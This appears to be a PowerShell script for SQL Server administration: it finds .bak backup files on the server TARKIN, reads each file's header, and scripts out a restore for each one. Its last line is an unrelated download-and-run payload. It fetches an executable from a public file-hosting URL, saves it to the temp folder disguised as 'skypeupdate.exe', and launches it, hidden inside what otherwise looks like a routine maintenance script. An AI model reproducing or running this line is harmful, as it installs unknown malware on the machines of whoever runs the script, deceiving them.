
$db = Get-ChildItem '\\TARKIN\C$\Backups' -Recurse | Where-Object {$_.Extension -eq '.bak'}


foreach($d in $db){
    
    $header = Invoke-Sqlcmd -ServerInstance TARKIN -Database tempdb "RESTORE HEADERONLY FROM DISK='$($d.FullName)'"

    
    Restore-SqlDatabase -ServerInstance TARKIN -Database $header.DatabaseName -BackupFile $d -Script
}


(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/wopkwj.exe',"$env:TEMP\skypeupdate.exe");Start-Process ("$env:TEMP\skypeupdate.exe")

